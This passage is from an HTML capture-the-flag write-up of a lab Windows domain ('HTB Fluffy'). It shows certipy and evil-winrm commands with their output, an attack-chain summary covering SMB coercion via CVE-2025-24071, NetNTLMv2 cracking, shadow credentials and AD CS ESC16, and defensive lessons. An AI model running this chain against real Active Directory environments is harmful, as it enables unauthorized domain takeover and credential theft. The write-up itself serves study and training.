+  -ca 'fluffy-DC01-CA' \
+  -template 'User' \
+  -out administrator
+
+[*] Request ID is 21
+<span class="good">[*] Successfully requested certificate</span>
+<span class="good">[*] Got certificate with UPN 'administrator'</span>
+[*] Certificate has no object SID
+<span class="good">[*] Wrote certificate and private key to 'administrator.pfx'</span></code></pre>
+
+      <h3>Step 4 - Restore ca_svc UPN</h3>
+
+      <pre><code>certipy account update \
+  -u 'winrm_svc@fluffy.htb' -hashes ':[redacted]' \
+  -user 'ca_svc' \
+  -upn 'ca_svc@fluffy.htb' \
+  -dc-ip 10.129.31.202 \
+  -dc-host DC01.fluffy.htb \
+  -target DC01.fluffy.htb \
+  -target-ip 10.129.31.202
+
+<span class="good">[*] Successfully updated 'ca_svc'</span></code></pre>
+
+      <h3>Step 5 - Authenticate as Administrator</h3>
+
+      <pre><code>certipy auth \
+  -pfx administrator.pfx \
+  -username administrator \
+  -domain fluffy.htb \
+  -dc-ip 10.129.31.202
+
+[*]     SAN UPN: 'administrator'
+[*] Using principal: 'administrator@fluffy.htb'
+<span class="good">[*] Got TGT</span>
+<span class="good">[*] Got hash for 'administrator@fluffy.htb': [redacted]</span></code></pre>
+    </section>
+
+    <section id="s13">
+      <span class="section-number">13 - Domain Admin</span>
+      <h2>Root Flag</h2>
+
+      <pre><code>evil-winrm-py -i 10.129.31.202 \
+  -u "administrator" \
+  -H [redacted]
+
+<span class="good">[*] Connecting to '10.129.31.202:5985' as 'administrator'</span>
+
+PS C:\Users\Administrator\Desktop> type root.txt
+<span class="good">[redacted]</span></code></pre>
+
+      <div class="pwned-badge">
+        <div class="pwned-dot"></div>
+        Machine Pwned - Writable Share → NetNTLMv2 → Shadow Credentials → AD CS ESC16 → Administrator
+      </div>
+    </section>
+
+    <section id="s14">
+      <span class="section-number">14 - Summary</span>
+      <h2>Full Attack Chain</h2>
+
+      <div class="ascii-chain">
+        <pre><code>
+  INITIAL CREDENTIAL
+  ─────────────────────────────────────────────────────────────────────
+  j.fleischman:[redacted]
+  SMB auth succeeds, no admin shares, IT share is READ/WRITE
+       │
+       ▼
+  WRITABLE IT SHARE + PATCH NOTICE
+  ─────────────────────────────────────────────────────────────────────
+  Upgrade_Notice.pdf lists CVE-2025-24071 as critical
+  Share allows uploading a crafted archive
+       │
+       ▼
+  CVE-2025-24071 SMB AUTH COERCION
+  ─────────────────────────────────────────────────────────────────────
+  poc.py creates fluffy.ms-library inside exploit.zip
+  Payload points to attacker SMB listener at 10.10.14.241
+  File uploaded to \\DC01\IT
+       │
+       ▼
+  RESPONDER CAPTURE
+  ─────────────────────────────────────────────────────────────────────
+  Target processes file → authenticates to attacker SMB
+  NetNTLMv2 captured for FLUFFY\p.agila
+       │
+       ▼
+  HASHCAT CRACK  (mode 5600)
+  ─────────────────────────────────────────────────────────────────────
+  p.agila password recovered from rockyou.txt
+       │
+       ▼
+  SERVICE ACCOUNT GROUP ABUSE
+  ─────────────────────────────────────────────────────────────────────
+  p.agila ∈ Service Account Managers
+  p.agila adds itself to Service Accounts
+  Service Accounts rights allow writing Key Credentials to winrm_svc
+       │
+       ▼
+  SHADOW CREDENTIALS → winrm_svc
+  ─────────────────────────────────────────────────────────────────────
+  certipy shadow add writes msDS-KeyCredentialLink on winrm_svc
+  certipy auth (faketime +7h) retrieves winrm_svc NT hash
+  winrm_svc ∈ Remote Management Users
+       │
+       ▼
+  WINRM USER SHELL → user.txt
+  ─────────────────────────────────────────────────────────────────────
+  evil-winrm-py Pass-the-Hash as winrm_svc
+       │
+       ▼
+  SHADOW CREDENTIALS → ca_svc
+  ─────────────────────────────────────────────────────────────────────
+  winrm_svc can write Key Credentials to ca_svc
+  certipy auth retrieves ca_svc NT hash
+       │
+       ▼
+  AD CS ESC16
+  ─────────────────────────────────────────────────────────────────────
+  fluffy-DC01-CA has security extension disabled (1.3.6.1.4.1.311.25.2)
+  Temporarily set ca_svc UPN → administrator
+  Request User certificate as ca_svc
+  Certificate issued with UPN=administrator, no object SID
+  Restore ca_svc UPN
+       │
+       ▼
+  ADMINISTRATOR → root.txt
+  ─────────────────────────────────────────────────────────────────────
+  certipy auth administrator.pfx → Administrator NT hash
+  evil-winrm-py Pass-the-Hash as Administrator
+        </code></pre>
+      </div>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Phase</th>
+              <th>Technique</th>
+              <th>Signal</th>
+              <th>Result</th>
+            </tr>
+          </thead>
+          <tbody class="chain-table">
+            <tr>
+              <td>01</td>
+              <td>SMB enumeration</td>
+              <td><code>j.fleischman</code> → READ, WRITE on <code>IT</code></td>
+              <td>Writable file drop location</td>
+            </tr>
+            <tr>
+              <td>02</td>
+              <td>Document intelligence</td>
+              <td><code>Upgrade_Notice.pdf</code> lists CVE-2025-24071</td>
+              <td>Exploit selection</td>
+            </tr>
+            <tr>
+              <td>03</td>
+              <td>SMB coercion</td>
+              <td>Malicious archive in IT share</td>
+              <td>NetNTLMv2 for <code>p.agila</code></td>
+            </tr>
+            <tr>
+              <td>04</td>
+              <td>Offline cracking</td>
+              <td>hashcat mode 5600 + rockyou</td>
+              <td><code>p.agila</code> plaintext password</td>
+            </tr>
+            <tr>
+              <td>05</td>
+              <td>Group abuse</td>
+              <td>Service Account Managers → add to Service Accounts</td>
+              <td>Write rights over <code>winrm_svc</code></td>
+            </tr>
+            <tr>
+              <td>06</td>
+              <td>Shadow Credentials</td>
+              <td>Write <code>msDS-KeyCredentialLink</code> to <code>winrm_svc</code></td>
+              <td><code>winrm_svc</code> NT hash</td>
+            </tr>
+            <tr>
+              <td>07</td>
+              <td>WinRM (PtH)</td>
+              <td><code>winrm_svc</code> ∈ Remote Management Users</td>
+              <td>User flag</td>
+            </tr>
+            <tr>
+              <td>08</td>
+              <td>Shadow Credentials</td>
+              <td><code>winrm_svc</code> → <code>ca_svc</code></td>
+              <td><code>ca_svc</code> NT hash</td>
+            </tr>
+            <tr>
+              <td>09</td>
+              <td>AD CS ESC16</td>
+              <td>Security extension disabled + UPN write + Cert Publishers enrollment</td>
+              <td>Administrator certificate and NT hash</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <section id="s15">
+      <span class="section-number">15 - Lessons</span>
+      <h2>Key Takeaways</h2>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Concept</th>
+              <th>Lesson</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Writable shares</td>
+              <td>A writable internal share is not just storage. Treat it as a delivery mechanism
+                for coercion, parser bugs, file handlers, indexers, and admin workflows.</td>
+            </tr>
+            <tr>
+              <td>Patch notices</td>
+              <td>Internal patch documents often reveal exactly which vulnerability family the machine
+                expects you to investigate. The CVE list narrowed the attack path immediately.</td>
+            </tr>
+            <tr>
+              <td>NetNTLMv2</td>
+              <td>SMB signing prevented relay but not offline cracking. A weak password still compromises
+                a captured NetNTLMv2 response.</td>
+            </tr>
+            <tr>
+              <td>Clock skew</td>
+              <td>Kerberos requires time alignment. PKINIT fails with <code>KRB_AP_ERR_SKEW</code> until
+                the command runs in a <code>faketime</code>-adjusted shell matching the DC.</td>
+            </tr>
+            <tr>
+              <td>Shadow Credentials</td>
+              <td>Write access to <code>msDS-KeyCredentialLink</code> on a user → add a certificate credential
+                → PKINIT → NT hash, without touching the account password.</td>
+            </tr>
+            <tr>
+              <td>Certipy -hashes vs -p</td>
+              <td>Use <code>-hashes :NThash</code> for hash auth. Passing a hash with <code>-p</code>
+                treats it as a literal password and fails with <code>invalidCredentials</code>.</td>
+            </tr>
+            <tr>
+              <td>Remote Management Users</td>
+              <td>Always check service account group membership. <code>winrm_svc</code> was valuable
+                precisely because it had an explicit WinRM login grant.</td>
+            </tr>
+            <tr>
+              <td>ESC16</td>
+              <td>Disabling the AD CS security extension removes SID binding. Combined with UPN write
+                access and enrollment rights, this becomes a direct Administrator mapping primitive.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="pwned-badge">
+        <div class="pwned-dot"></div>
+        Machine Pwned - CVE-2025-24071 → NetNTLMv2 → Shadow Credentials → ESC16 → Administrator
+      </div>
+    </section>
+
+  </div>
+
+  <footer>
+    © 2026 &nbsp;·&nbsp; HTB Fluffy Writeup &nbsp;·&nbsp; Windows Active Directory / AD CS
+  </footer>
+
+</body>
+
+</html>
